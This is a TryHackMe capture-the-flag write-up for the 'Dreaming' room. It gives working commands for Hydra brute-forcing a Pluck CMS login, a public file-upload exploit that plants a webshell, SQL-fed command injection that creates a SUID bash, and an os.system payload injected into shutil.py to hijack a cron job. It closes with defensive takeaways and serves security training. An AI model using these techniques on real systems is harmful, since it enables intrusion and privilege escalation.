# TryHackMe — Dreaming

> *"What power would hell have if those here imprisoned were not able to dream of heaven?"*

**Difficulty:** Easy  
**Category:** Linux, Web, Privilege Escalation  
**Tags:** CVE-2020-29607, Pluck CMS, SQL Injection, Python Library Hijacking, SUID

---

## Table of Contents

- [Recon](#recon)
- [Enumeration](#enumeration)
- [Foothold — CVE-2020-29607 (Pluck CMS RCE)](#foothold)
- [Privilege Escalation — www-data → lucien](#privesc-lucien)
- [Privilege Escalation — lucien → death](#privesc-death)
- [Privilege Escalation — death → morpheus](#privesc-morpheus)

---

## Recon

### Port Scan

Starting with a RustScan + Nmap service scan:

```bash
rustscan -a [IP] -- -sC -sV
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | open  | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | open  | HTTP    | Apache 2.4.41 |

Only two ports open — SSH and a web server.

---

## Enumeration

### Web Enumeration

Visiting `http://[IP]/` shows the default Apache2 Ubuntu page.

Running Feroxbuster to enumerate directories:

```bash
feroxbuster -u http://[IP]/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,bak \
  -s 200,301,403,401 \
  -t 50
```

**Interesting finding:**

```
301  http://[IP]/app => http://[IP]/app/
301  http://[IP]/app/pluck-4.7.13 => http://[IP]/app/pluck-4.7.13/
```

Visiting `http://[IP]/app/pluck-4.7.13/` reveals a **Pluck CMS 4.7.13** installation.

The page also exposes a login panel at `/app/pluck-4.7.13/login.php`


### Method 2 — Bruteforce with Hydra

Alternatively, the login form can be bruteforced directly. Since Pluck CMS uses a **password-only** form (no username field), the `^PASS^` placeholder is used for the `cont1` parameter:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt [IP] http-post-form \
  "/app/pluck-4.7.13/login.php:cont1=^PASS^&submit=Log+in:Password incorrect"
```

**Output:**
```
[80][http-post-form] host: [IP]   login: admin   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-10-26 10:14:02
```

---

## Foothold

### CVE-2020-29607 — Pluck CMS 4.7.13 File Upload RCE

**CVE Description:**  
A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an authenticated admin user to upload a `.phar` file via the "manage files" functionality, resulting in Remote Code Execution.

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2020-29607
- https://www.exploit-db.com/exploits/49909

Using the public exploit:

```bash
python3 exploit.py [IP] 80 [REDACTED] /app/pluck-4.7.13/
```

**Output:**
```
Authentication was successful, uploading webshell
Uploaded Webshell to: http://[IP]:80/app/pluck-4.7.13//files/shell.phar
```

The webshell is now accessible at:
```
http://[IP]/app/pluck-4.7.13/files/shell.phar
```

We now have RCE as **www-data**.

---

## Privilege Escalation

### www-data → lucien {#privesc-lucien}

#### Enumeration as www-data

Exploring the filesystem, we find an interesting Python script owned by lucien:

```bash
cat /opt/test.py
```

```python
import requests

# Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[REDACTED]"

data = {
    "cont1": password,
    "bogus": "",
    "submit": "Log+in"
}

req = requests.post(url, data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
```

**Credentials found:** `lucien : [REDACTED]`

Switching to lucien:

```bash
su lucien
# Password: [[REDACTED]]
```

#### Flag 1 — Lucien

```bash
cat /home/lucien/lucien_flag.txt
```

> `THM{REDACTED}`

---

### lucien → death {#privesc-death}

#### Sudo Enumeration

```bash
sudo -l
```

```
User lucien may run the following commands on ip-[IP]:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Lucien can run `getDreams.py` **as death** without a password.

#### Analyzing getDreams.py

We cannot read `/home/death/getDreams.py` directly, but a reference copy exists at `/opt/getDreams.py`:

```python
import mysql.connector
import subprocess

DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

def getDreams():
    connection = mysql.connector.connect(
        host="localhost",
        user=DB_USER,
        password=DB_PASS,
        database=DB_NAME
    )
    cursor = connection.cursor()
    query = "SELECT dreamer, dream FROM dreams;"
    cursor.execute(query)
    dreams_info = cursor.fetchall()

    for dream_info in dreams_info:
        dreamer, dream = dream_info
        command = f"echo {dreamer} + {dream}"
        shell = subprocess.check_output(command, text=True, shell=True)
        print(shell)
```

**Vulnerability:** The script uses `subprocess.check_output(..., shell=True)` with **unsanitized data from the database**. This is a classic **command injection** vector.

#### Finding MySQL Credentials for lucien

Checking lucien's bash history:

```bash
cat ~/.bash_history
```

Reveals: `mysql -u lucien -p'[REDACTED]'`

#### SQL Injection via MySQL

Connecting to the database:

```bash
mysql -u lucien -p'[REDACTED]' library
```

The `dreams` table feeds directly into the vulnerable shell command. We inject a command substitution payload:

```sql
INSERT INTO dreams (dreamer, dream) VALUES ('pwn', '$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)');
```

Running the script as death:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The payload `$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)` is executed by the shell due to `shell=True`, copying bash with a **SUID bit** set as death.

Spawning a shell as death:

```bash
/tmp/bash -p
```

```
uid=1000(lucien) gid=1000(lucien) euid=1001(death) egid=1001(death)
```

#### Flag 2 — Death

```bash
cat /home/death/death_flag.txt
```

> `THM{REDACTED}`

---

### death → morpheus {#privesc-morpheus}

#### Enumeration as death

In `/home/morpheus/`, we find a script `restore.py`:

```python
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

This script is run periodically by **morpheus** via a cronjob.

Key observation — checking permissions on the Python standard library:

```bash
ls -la /usr/lib/python3.8/shutil.py
```

```
-rw-rw-r-- 1 root death 51474 Mar 18 2025 /usr/lib/python3.8/shutil.py
```

**death has write access to `/usr/lib/python3.8/shutil.py`!**

#### Python Library Hijacking

Since `restore.py` imports `from shutil import copy2`, and we control `shutil.py`, we can inject malicious code into the `copy2` function.

Injecting a payload to read morpheus's flag:

```bash
python3 -c "
content = open('/usr/lib/python3.8/shutil.py').read()
inject = 'import os\nos.system(\"cat /home/morpheus/morpheus_flag.txt > /tmp/morp && chmod 777 /tmp/morp\")\n'
content = content.replace('def copy2(', inject + 'def copy2(')
open('/usr/lib/python3.8/shutil.py', 'w').write(content)
print('Done!')
"
```

Verifying the injection:

```bash
grep -A 3 "morp" /usr/lib/python3.8/shutil.py
```

Waiting for the cronjob to execute `restore.py` as morpheus, then:

```bash
cat /tmp/morp
```

#### Flag 3 — Morpheus

> `THM{REDACTED}`


## Attack Chain

```
[CVE-2020-29607] Pluck CMS File Upload RCE
    │
    ▼
[www-data] webshell
    │
    ├─► /opt/test.py contains lucien's plaintext password
    ▼
[lucien] [REDACTED]
    │
    ├─► sudo -u death /usr/bin/python3 /home/death/getDreams.py
    ├─► MySQL injection → shell=True command injection
    ├─► SUID bash at /tmp/bash
    ▼
[death] euid via SUID bash
    │
    ├─► death owns /usr/lib/python3.8/shutil.py
    ├─► restore.py runs as morpheus via cronjob
    ├─► Python Library Hijacking on shutil.copy2
    ▼
[morpheus] flag read via injected shutil
```

---

## Key Takeaways

- **Credential reuse** is a common pitfall — always check scripts and config files for hardcoded passwords.
- **`subprocess.check_output(..., shell=True)`** with unvalidated database input is a critical command injection vulnerability. Always sanitize inputs and avoid `shell=True`.
- **Python Library Hijacking** is a powerful privilege escalation technique when a privileged script imports a library that a lower-privileged user can write to. Always audit file ownership on standard library files.
- **SUID binaries** created by privileged users can be leveraged for lateral movement — monitor `/tmp` and world-writable directories.

---

*Writeup by SubZer030 — TryHackMe: Dreaming*